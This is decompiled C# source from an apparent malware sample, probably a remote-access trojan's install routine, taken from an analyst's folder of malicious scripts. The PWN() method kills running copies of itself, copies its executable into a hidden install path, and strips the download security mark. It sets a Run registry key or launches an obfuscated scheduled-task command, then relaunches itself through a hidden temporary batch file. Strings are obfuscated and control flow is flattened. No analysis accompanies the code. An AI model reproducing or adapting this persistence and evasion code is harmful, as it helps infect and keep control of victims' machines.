// Decompiled with JetBrains decompiler
// Type: gWJ.BWF
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using VW1;

namespace gWJ
{
  internal class BWF
  {
    internal static BWF slD;

    public static void PWN()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(XWr.InstallFolder), XWr.InstallSecondFolder, XWr.InstallFile));
        string executablePath = Application.ExecutablePath;
        if (!BWF.mlF((object) executablePath, (object) fileInfo.FullName))
          return;
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.MainModule.FileName == fileInfo.FullName)
              process.Kill();
          }
          catch
          {
          }
        }
        if (!NdD.bx(NdD.OdW))
          goto label_14;
        else
          goto label_18;
label_13:
        if (fileInfo.Exists)
        {
          File.Delete(fileInfo.FullName);
          Thread.Sleep(1000);
        }
        if (!fileInfo.Directory.Exists)
          fileInfo.Directory.Create();
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew, FileAccess.Write);
        try
        {
          byte[] buffer = File.ReadAllBytes(executablePath);
          fileStream.Write(buffer, 0, buffer.Length);
        }
        finally
        {
          if (fileStream != null)
            BWF.clX((object) fileStream);
        }
        if (BWF.hlN((object) XWr.EnableDeleteZoneIdentifier))
          ndy.bx((string) BWF.bl7((object) fileInfo.FullName, (object) w4.bx(11112, w4.vY)), ndy.qd9);
        string path = Path.GetTempFileName() + w4.bx(11148, w4.vY);
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine(w4.bx(11160, w4.vY));
          streamWriter.WriteLine(w4.bx(11182, w4.vY));
          streamWriter.WriteLine(w4.bx(11216, w4.vY) + fileInfo.FullName + w4.bx(1376, w4.vY));
          streamWriter.WriteLine(w4.bx(11240, w4.vY) + Path.GetTempPath());
          streamWriter.WriteLine(w4.bx(11250, w4.vY) + (string) BWF.rlh((object) path) + w4.bx(11264, w4.vY));
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        yd.bx(yd.rdN);
        return;
label_14:
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(w4.bx(11016, w4.vY)), RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.FullName), (object) (w4.bx(1376, w4.vY) + fileInfo.FullName + w4.bx(1376, w4.vY)));
          goto label_13;
        }
label_18:
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = w4.bx(10544, w4.vY);
        startInfo.Arguments = w4.bx(10870, w4.vY) + fileInfo.Name + w4.bx(10976, w4.vY) + fileInfo.FullName + w4.bx(10994, w4.vY);
        startInfo.UseShellExecute = true;
        startInfo.CreateNoWindow = true;
        int num1 = 0;
        if (BWF.ul9() != null)
          goto label_4;
label_3:
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_13;
            case 2:
              Process.Start(startInfo);
              if (BWF.ul9() == null)
              {
                num1 = 1;
                continue;
              }
              break;
            default:
              startInfo.WindowStyle = ProcessWindowStyle.Hidden;
              if (BWF.Wlc())
              {
                num1 = 2;
                continue;
              }
              break;
          }
          int num2;
          num1 = num2;
        }
label_4:
        num1 = 0;
        goto label_3;
      }
      catch (Exception ex)
      {
      }
    }

    public BWF()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool mlF([In] object obj0, [In] object obj1) => (string) obj0 != (string) obj1;

    internal static void clX([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static bool hlN([In] object obj0) => Convert.ToBoolean((string) obj0);

    internal static object bl7([In] object obj0, [In] object obj1) => (object) ((string) obj0 + (string) obj1);

    internal static object rlh([In] object obj0) => (object) Path.GetFileName((string) obj0);

    internal static bool Wlc() => BWF.slD == null;

    internal static BWF ul9() => BWF.slD;
  }
}
